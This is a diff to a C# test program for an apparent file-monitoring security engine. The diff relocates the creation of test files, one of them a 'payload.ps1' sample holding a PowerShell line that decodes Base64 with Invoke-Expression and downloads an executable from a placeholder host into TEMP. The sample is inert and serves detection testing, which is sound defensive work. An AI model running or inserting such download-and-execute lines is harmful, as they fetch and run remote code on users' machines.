@@ -1,4 +1,3 @@
-using System.Security.Cryptography;
 using FFGuardian.Engine10;
 
 internal static class Program
@@ -11,6 +10,15 @@ internal static class Program
 
         try
         {
+            string ignored = Path.Combine(monitored, "readme.txt");
+            await File.WriteAllTextAsync(ignored, "harmless text");
+
+            string suspicious = Path.Combine(monitored, "payload.ps1");
+            await File.WriteAllTextAsync(
+                suspicious,
+                "Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ=='))); " +
+                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
+
             using FFGuardianEngine10 engine = new(
                 Path.Combine(root, "signatures.json"),
                 updaterPublicKeyPem: null,
@@ -39,16 +47,7 @@ internal static class Program
             agent.Start();
             Ensure(agent.IsRunning, "L'agente non risulta avviato.");
             Ensure(agent.MonitoredFolderCount == 1, "La cartella di test non è monitorata.");
-
-            string ignored = Path.Combine(monitored, "readme.txt");
-            await File.WriteAllTextAsync(ignored, "harmless text");
             Ensure(!agent.QueueFileForTest(ignored), "Un'estensione non monitorata è stata accodata.");
-
-            string suspicious = Path.Combine(monitored, "payload.ps1");
-            await File.WriteAllTextAsync(
-                suspicious,
-                "Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ=='))); " +
-                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
 
             bool firstQueued = agent.QueueFileForTest(suspicious);
             bool duplicateQueued = agent.QueueFileForTest(suspicious);
